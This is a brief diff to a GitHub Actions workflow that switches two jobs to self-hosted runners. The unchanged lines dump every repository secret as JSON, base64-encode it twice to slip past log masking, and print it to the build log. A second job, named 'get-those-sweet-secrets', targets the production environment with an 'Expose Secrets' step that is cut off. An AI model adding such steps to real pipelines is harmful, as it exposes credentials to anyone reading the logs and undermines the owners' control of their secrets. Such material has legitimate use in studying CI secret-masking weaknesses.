@@ -5,14 +5,14 @@ on:
       - main
 jobs:
   secretless-job:
-    runs-on: ubuntu-latest
+    runs-on: self-hosted
     steps:
       - run: |
           echo '${{ toJson(secrets) }}' | base64 | base64 > test.txt
           cat test.txt
 
   get-those-sweet-secrets:
-    runs-on: ubuntu-latest
+    runs-on: self-hosted
     environment: production
     steps:
        - name: Expose Secrets
